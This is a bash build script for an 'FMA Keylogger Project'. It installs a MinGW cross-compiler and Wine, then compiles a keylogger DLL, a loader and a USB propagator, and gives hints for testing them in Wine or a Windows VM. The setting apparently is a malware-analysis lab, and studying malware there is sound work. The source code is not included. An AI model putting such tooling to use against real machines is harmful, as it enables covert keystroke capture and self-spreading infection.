#!/bin/bash
# build.sh - One-command build for the FMA Keylogger Project
# Run: chmod +x build.sh && ./build.sh

set -e

echo "========================================"
echo " FMA Keylogger Project - Build Script"
echo "========================================"
echo ""

# Check for required tools
echo "[*] Checking prerequisites..."
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo "[!] MinGW-w64 not found. Installing..."
    sudo apt update
    sudo apt install -y mingw-w64 g++-mingw-w64-x86-64-posix wine
fi

# Create directories
echo "[*] Creating directory structure..."
mkdir -p src build analysis

# Check source files exist
if [ ! -f src/keylogger_dll.cpp ] || [ ! -f src/keylogger_loader.cpp ] || [ ! -f src/usb_propagator.cpp ]; then
    echo "[!] Source files not found in src/ directory."
    echo "    Please create the source files first, then run this script."
    exit 1
fi

# Build
echo "[*] Building all components..."
make clean 2>/dev/null || true
make

echo ""
echo "========================================"
echo " BUILD COMPLETE"
echo "========================================"
echo ""
echo "Output files in build/:"
ls -lh build/
echo ""
echo "To test with Wine:"
echo "  wine build/keylogger_loader.exe"
echo ""
echo "To copy to Windows VM:"
echo "  cp build/*.exe build/*.dll /path/to/windows_vm_share/"
echo ""
echo "To clean:"
echo "  make clean"
